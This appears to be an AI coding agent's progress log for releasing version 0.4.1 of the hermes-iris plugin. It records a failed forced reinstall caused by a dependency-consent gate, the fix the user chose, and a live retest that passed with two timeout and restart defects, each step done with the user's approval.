- Result: Hermes refused. The panel showed "Plugin 'iris' was not published: Reinstall declined: dependency install skipped (non-interactive). The installed plugin and active environment are unchanged." Read-only SSH confirmed it: `~/.hermes/plugins/iris` still `0.3.0`, no second plugin directory, `~/.hermes/iris/` untouched.
- Cause, read in Hermes 2026.9.24 (`hermes_cli/plugins_cmd_install.py`, `pm/plugin_declarations.py`, `web_routers/dashboard_ui.py`): `PythonDeclaration.is_member` is true for any plugin that has a `pyproject.toml`, even with `dependencies = []`. Such a plugin goes through the Python-deps consent gate. `dashboard_install_plugin` sets consent to `enable and not force`, and the route passes no consent, so a forced reinstall (which our pinned update needs) is always refused; a fresh non-forced install is consented. So the one-tap Update cannot work while `server/hermes-iris/pyproject.toml` exists. The fresh-install path (Install on a server without the plugin) is not affected, but is also not tested live.
- Second finding: the failure panel showed the message but no copyable command (the route answered with an HTTP status, not a 200 `ok: false`, and the installer only offers the command for 404, 405 or a status-less rejection). Review Focus 5 expects the command; the plan's own test `a server error shows its message, without the command` pins the opposite for server errors. Not changed yet.
- Options for the user: (A) move `pyproject.toml` out of the plugin dir (the plugin has no runtime deps; it is only used for the test extras), release 0.4.1, re-pin, retest; (B) keep it and tell users to run the fallback with `--yes-deps` by hand; (C) both.
- Next: the user's choice. Step 3 (fallback command by hand, which also needs `--yes-deps` or a TTY) is not run.

### IN3 - Task 5 - doing (option A chosen) - 2026-11-23 - Sonnet 5.5
- User chose A: drop `pyproject.toml` from the plugin and release 0.4.1.
- Commits: 1b59c0c and 8767a65 (plugin: `pyproject.toml` replaced by `pytest.ini`, version 0.4.1 in `plugin.yaml`, `manifest.json`, `__init__.py`, README; changelog line); then the app pin commit `feat(plugin): pin the hermes-iris 0.4.1 release commit`. Local annotated tag `hermes-iris-v0.4.1` at `8767a65ce9fba5ae6be39e145f43330cd9e78373`. NOT pushed. `hermes-iris-v0.4.0` stays pushed but is superseded (it cannot be updated through Hermes).
- Verified: new test `test_no_pyproject_in_the_plugin_directory` failed first; plugin `pytest` -> 522 pass, 3 skipped; `flutter test --exclude-tags live` -> 1,946 pass, 4 skipped; `flutter analyze lib test` -> the 3 old infos.
- Not changed (not part of A): the failure panel still shows the fallback command only for 404, 405 and status-less rejections.
- Next: the user's yes to push `feat/push` and the tag `hermes-iris-v0.4.1` (Hermes fetches the commit from GitHub, so the live retest needs it), then rebuild, install on the Moto G45, tap Update.

### IN3 - Task 5 Step 2 live reinstall - passed with two defects - 2026-11-23 - Sonnet 5.5
- Pushed `feat/push` (to `11cc65c`) and tag `hermes-iris-v0.4.1` with the user's yes. Debug arm64 APK from `ee58701` on the Moto G45, Settings, Iris plugin, "Update to 0.4.1".
- Result: the forced reinstall passed Hermes's dependency gate (no `pyproject.toml` now). On the server: `~/.hermes/plugins/iris` is `0.4.1`, no `pyproject.toml`, one plugin dir (the `.install-*` staging dir was removed), `.install-metadata.json` pins `iris` to `8767a65ce9fba5ae6be39e145f43330cd9e78373`, `~/.hermes/iris/default` untouched (flags, profile, push, surfaces, templates, usage keep their old timestamps). No consent or scan prompt appeared once the pyproject was gone. After the user approved a `hermes-dashboard` restart, the app read `Iris plugin 0.4.1 - Up to date`. Push: "Iris is connected" (foreground service types 0x200). Displays: the surfaces dir and the plugin routes answer. Not rerun: a full reply notification and a new display turn (each waits >= 240 s); the stack around them is unchanged.
- Defect 1 (not fixed): the install takes about 3 minutes (Hermes runs `uv sync` for the whole environment when it enables the plugin), and Cloudflare cuts a request at 120 s. The app showed "The origin web server did not return a complete response within the 120-second Proxy Read Timeout window" with Try again, although the install carried on and succeeded. A user who taps Try again starts a second install. Fix idea: on a gateway timeout (524, 504, 502 or that text) poll capabilities until the pinned version shows, up to about 5 minutes, and say "Still installing on your server".
- Defect 2 (not fixed): after the install the running dashboard still reported `0.3.0` (the dashboard process keeps the old plugin routes); it read `0.4.1` only after `systemctl restart hermes-dashboard`. The app cannot restart it. Fix idea: if the re-probe still reads the old version, say "Installed. Restart your Hermes dashboard to finish" (with the version it will show). 
- Also still open: the failure panel offers the fallback command only for 404, 405 and status-less rejections; and Android shows no command on a timeout.
- Plugin 0.4.0 tag stays on GitHub and is superseded. The app pins 0.4.1.
- Next: the user decides whether to fix defects 1 and 2 test-first inside IN3 (recommended) or log them as follow-ups; then write `segment IN3 complete`.
